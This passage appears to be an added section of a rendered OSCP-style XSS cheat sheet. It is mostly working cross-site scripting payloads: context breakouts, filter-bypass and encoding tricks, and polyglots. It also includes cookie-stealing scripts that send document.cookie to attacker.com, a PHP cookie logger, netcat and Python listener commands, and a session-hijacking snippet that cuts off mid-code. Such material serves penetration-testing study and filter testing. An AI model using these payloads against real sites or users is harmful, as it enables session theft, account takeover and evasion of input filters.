+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>&quot; onerror=&quot;alert(1)
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>&#39; onerror=&#39;alert(1)
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="cm">&lt;!-- Event handlers in attributes --&gt;</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>&quot;&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>&#39;&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>&quot;&gt;<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="javascript-context">JavaScript Context</h3>
+<p><strong>Input reflected inside JavaScript code</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">// Breaking out of string</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="s1">&#39;-alert(1)-&#39;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="err">&quot;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span><span class="c1">//</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="s1">&#39;;alert(1);//</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="s1">\&quot;;alert(1);//</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="s1">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="s1">// Template literals</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="s1">${alert(1)}</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="s1">`${alert(1)}`</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="s1">// Breaking out of variable assignment</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="s1">var x = &#39;</span><span class="nx">USER_INPUT</span><span class="s1">&#39;;</span>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="s1">// Payload: &#39;</span><span class="p">;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span><span class="w"> </span><span class="c1">//</span>
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="c1">// Result: var x = &#39;&#39;; alert(1); //&#39;;</span>
+</span></code></pre></div>
+<h3 id="url-context">URL Context</h3>
+<p><strong>Input reflected in URL/href attribute</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cm">&lt;!-- JavaScript protocol --&gt;</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>javascript:alert(1)
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>javascript:alert(document.cookie)
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>javascript:alert(document.domain)
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="cm">&lt;!-- Data protocol --&gt;</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>data:text/html,<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="cm">&lt;!-- In href attribute --&gt;</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>Click<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="p">&gt;</span>Click<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="filter-bypass-techniques">Filter Bypass Techniques</h2>
+<h3 id="1-case-manipulation">1. Case Manipulation</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">ScRiPt</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">ScRiPt</span><span class="p">&gt;</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">&lt;</span><span class="nt">sCrIpT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">sCrIpT</span><span class="p">&gt;</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="p">&lt;</span><span class="nt">iMg</span> <span class="na">sRc</span><span class="o">=</span><span class="s">x</span> <span class="na">oNeRRoR</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="2-encoding">2. Encoding</h3>
+<p><strong>HTML Entity Encoding:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">40</span><span class="p">;</span><span class="mf">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">41</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="n">#x28</span><span class="p">;</span><span class="mf">1</span><span class="o">&amp;</span><span class="n">#x29</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert&amp;#40;1&amp;#41;</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>URL Encoding:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>%3Cscript%3Ealert(1)%3C/script%3E
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>%3Cimg%20src=x%20onerror=alert(1)%3E
+</span></code></pre></div></p>
+<p><strong>Unicode Encoding:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">\u0061lert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">\u0061\u006c\u0065\u0072\u0074</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>Hex Encoding:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;\x61\x6c\x65\x72\x74\x28\x31\x29&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>Base64 (for data URIs):</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<h3 id="3-tag-variations">3. Tag Variations</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="p">&lt;</span><span class="nt">script</span>   <span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="p">&lt;</span><span class="nt">script</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="p">&lt;</span><span class="nt">script</span><span class="err">/</span><span class="na">x</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="p">&lt;</span><span class="nt">script</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="4-bypassing-keyword-filters">4. Bypassing Keyword Filters</h3>
+<p><strong>If "script" is blocked:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="p">&lt;</span><span class="nt">select</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="p">&lt;</span><span class="nt">marquee</span> <span class="na">onstart</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="p">&lt;</span><span class="nt">details</span> <span class="na">open</span> <span class="na">ontoggle</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>If "alert" is blocked:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">confirm</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">prompt</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;ale&#39;</span><span class="o">+</span><span class="s1">&#39;rt(1)&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">[</span><span class="s1">&#39;alert&#39;</span><span class="p">](</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">top</span><span class="p">[</span><span class="s1">&#39;alert&#39;</span><span class="p">](</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">self</span><span class="p">[</span><span class="s1">&#39;alert&#39;</span><span class="p">](</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;(</span><span class="nx">alert</span><span class="p">)(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>If "()" is blocked:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="k">throw</span><span class="w"> </span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="k">throw</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">,</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;{</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">}</span><span class="k">throw</span><span class="w"> </span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>If spaces are blocked:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">x/onerror=alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="p">&lt;</span><span class="nt">iframe</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<h3 id="5-comment-tricks">5. Comment Tricks</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cm">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="c">&lt;!--</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c1">//--&gt;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="6-null-byte-injection">6. Null Byte Injection</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>%00.jpg
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x%00</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="polyglot-payloads">Polyglot Payloads</h2>
+<p><strong>Work in multiple contexts:</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nx">javascript</span><span class="o">:</span><span class="cm">/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cm">&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/</span><span class="p">[]</span><span class="o">/+</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="c1">//&#39;&gt;</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="nx">jaVasCript</span><span class="o">:</span><span class="cm">/*-/*`/*\`/*&#39;/*&quot;/**/</span><span class="p">(</span><span class="cm">/* */</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="c1">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#39;XSS&#39;)//\x3e</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="err">&#39;&quot;</span><span class="o">&gt;&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="c1">//</span>
+</span></code></pre></div>
+<hr />
+<h2 id="oscp-specific-exploitation">OSCP-Specific Exploitation</h2>
+<h3 id="1-cookie-stealing">1. Cookie Stealing</h3>
+<p><strong>Basic Cookie Stealer:</strong>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/steal.php?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/steal.php?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/steal.php?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
+<p><strong>Setup Listener:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Python HTTP Server with logging</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1"># Netcat listener</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="c1"># PHP cookie stealer (steal.php)</span>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>&lt;?php
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="nv">$cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;c&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>file_put_contents<span class="o">(</span><span class="s1">&#39;cookies.txt&#39;</span>,<span class="w"> </span><span class="nv">$cookie</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;\n&quot;</span>,<span class="w"> </span>FILE_APPEND<span class="o">)</span><span class="p">;</span>
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>?&gt;
+</span></code></pre></div></p>
+<h3 id="2-session-hijacking">2. Session Hijacking</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1">// Steal session token</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/log?session=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
